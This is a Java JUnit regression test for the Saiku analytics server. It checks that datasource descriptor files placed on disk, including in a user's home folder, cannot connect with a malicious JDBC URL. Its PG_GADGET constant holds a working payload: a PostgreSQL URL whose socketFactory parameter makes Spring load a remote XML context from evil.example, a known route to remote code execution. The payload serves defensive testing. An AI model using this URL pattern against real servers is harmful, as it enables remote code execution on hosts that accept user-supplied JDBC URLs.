/*
 *   Copyright 2026 Spicule Ltd
 *   Apache License, Version 2.0.
 */
package org.saiku.service.datasource;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

import java.io.File;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.sql.DriverManager;
import java.util.Collections;
import org.junit.After;
import org.junit.Before;
import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.TemporaryFolder;
import org.saiku.datasources.connection.ISaikuConnection;
import org.saiku.datasources.connection.RecordingJdbcDriver;
import org.saiku.datasources.connection.SaikuConnectionFactory;
import org.saiku.datasources.datasource.SaikuDatasource;
import org.saiku.repository.DataSource;
import org.saiku.repository.FilesystemRepositoryManager;
import org.saiku.repository.ScopedRepo;
import org.saiku.service.user.UserService;

/**
 * saiku#1902 / saiku#1903 — the <em>file-load</em> path end to end: an {@code .sds} descriptor on
 * disk → {@link FilesystemRepositoryManager#getAllDataSources()} → {@link
 * RepositoryDatasourceManager} property setup → {@link SaikuConnectionFactory}. Before the fix the
 * only validation lived in the admin REST mapper, so a descriptor that reached the repository by
 * any other route (a user's writable home, the world-writable {@code /datasources}) connected its
 * URL verbatim on boot or refresh.
 */
public class DatasourceFileLoadPolicyTest {

    private static final String TEST_SCHEME = "saikutest";

    private static final String PG_GADGET = "jdbc:postgresql://evil.example:5432/db"
            + "?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext"
            + "&amp;socketFactoryArg=http://evil.example/ctx.xml";

    @Rule
    public TemporaryFolder tmp = new TemporaryFolder();

    private File datadir;
    private FilesystemRepositoryManager frm;
    private RepositoryDatasourceManager rdm;
    private RecordingJdbcDriver driver;

    @Before
    public void setUp() throws Exception {
        resetSingleton();
        datadir = tmp.newFolder("repo");
        // Bootstrap markers so getDatadir()'s lazy seeding branch is skipped (same trick the ACL tests use).
        mkdirs(new File(datadir, "unknown/etc"));
        mkdirs(new File(datadir, "unknown/homes/bob"));
        mkdirs(new File(datadir, "unknown/datasources"));

        frm = newManager(datadir.getAbsolutePath());
        UserService us = new UserService();
        us.setAdminRoles(Collections.singletonList("ROLE_ADMIN"));
        injectUserService(frm, us);

        rdm = new RepositoryDatasourceManager();
        rdm.setRepositoryManager(frm);
        rdm.setType("classpath");
        rdm.setWorkspaces("false");
        rdm.setDatadir(datadir.getAbsolutePath());

        driver = new RecordingJdbcDriver();
        DriverManager.registerDriver(driver);
        System.setProperty(JdbcUrlPolicy.ALLOWED_SCHEMES_PROPERTY, TEST_SCHEME);
    }

    @After
    public void tearDown() throws Exception {
        DriverManager.deregisterDriver(driver);
        System.clearProperty(JdbcUrlPolicy.ALLOWED_SCHEMES_PROPERTY);
        resetSingleton();
    }

    @Test
    public void descriptorInAUserHome_isDiscoveredByTheLoader() throws Exception {
        // Documents WHY the write-side block matters: the loader does not confine itself to
        // /datasources — anything ending in .sds anywhere under the datadir is a datasource.
        writeSds(
                new File(datadir, "unknown/homes/bob/evil.sds"),
                "evil",
                "mondrian.olap4j.MondrianOlap4jDriver",
                mondrian(PG_GADGET));
        boolean found = false;
        for (DataSource d : frm.getAllDataSources()) {
            if ("evil".equals(d.getName())) {
                found = true;
            }
        }
        assertTrue("a *.sds in /homes/bob must be listed by getAllDataSources()", found);
    }

    @Test
    public void gadgetDescriptorLoadedFromDisk_isNeverConnected() throws Exception {
        writeSds(
                new File(datadir, "unknown/homes/bob/evil.sds"),
                "evil",
                "mondrian.olap4j.MondrianOlap4jDriver",
                mondrian(PG_GADGET));

        SaikuDatasource ds = rdm.getDatasource("evil");
        assertNotNull("the descriptor is loaded (validation is at connect time, not load time)", ds);
        assertTrue(
                "the loader hands the URL through verbatim",
                ds.getProperties().getProperty(ISaikuConnection.URL_KEY).contains("socketFactory="));

        try {
            SaikuConnectionFactory.getConnection(ds);
            fail("the file-loaded gadget URL must be refused at the chokepoint");
        } catch (IllegalArgumentException expected) {
            assertTrue(expected.getMessage(), expected.getMessage().contains("Invalid datasource JDBC URL"));
        }
        assertEquals("no driver may ever see the gadget URL", 0, driver.connectCalls.get());
    }

    @Test
    public void benignDescriptorLoadedFromDisk_stillConnects() throws Exception {
        writeSds(
                new File(datadir, "unknown/datasources/good.sds"),
                "good",
                RecordingJdbcDriver.class.getName(),
                "jdbc:" + TEST_SCHEME + ":ok");

        SaikuDatasource ds = rdm.getDatasource("good");
        assertNotNull(ds);
        ISaikuConnection con = SaikuConnectionFactory.getConnection(ds);
        assertNotNull("a permitted descriptor must still open through the same path", con);
        assertTrue(con.initialized());
        assertEquals(1, driver.connectCalls.get());
    }

    /* ---------------------------------------------------------------- helpers */

    private static String mondrian(String inner) {
        return "jdbc:mondrian:Jdbc=" + inner + ";Catalog=file:/tmp/x.xml;JdbcDrivers=org.postgresql.Driver";
    }

    private static void writeSds(File target, String name, String driverClass, String location) throws Exception {
        String xml = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n"
                + "<dataSource>\n"
                + "    <driver>" + driverClass + "</driver>\n"
                + "    <id>" + name + "-id</id>\n"
                + "    <location>" + location + "</location>\n"
                + "    <name>" + name + "</name>\n"
                + "    <password></password>\n"
                + "    <securityenabled>false</securityenabled>\n"
                + "    <type>OLAP</type>\n"
                + "    <username>sa</username>\n"
                + "</dataSource>\n";
        Files.write(target.toPath(), xml.getBytes(StandardCharsets.UTF_8));
    }

    private static void mkdirs(File dir) {
        if (!dir.exists() && !dir.mkdirs()) {
            throw new IllegalStateException("Could not create " + dir);
        }
    }

    private static FilesystemRepositoryManager newManager(String path) throws Exception {
        Constructor<FilesystemRepositoryManager> ctor = FilesystemRepositoryManager.class.getDeclaredConstructor(
                String.class, String.class, ScopedRepo.class, boolean.class);
        ctor.setAccessible(true);
        return ctor.newInstance(path, "ROLE_USER", new ScopedRepo(), false);
    }

    private static void injectUserService(FilesystemRepositoryManager mgr, UserService us) throws Exception {
        Field f = FilesystemRepositoryManager.class.getDeclaredField("userService");
        f.setAccessible(true);
        f.set(mgr, us);
    }

    private static void resetSingleton() throws Exception {
        Field ref = FilesystemRepositoryManager.class.getDeclaredField("ref");
        ref.setAccessible(true);
        ref.set(null, null);
    }
}
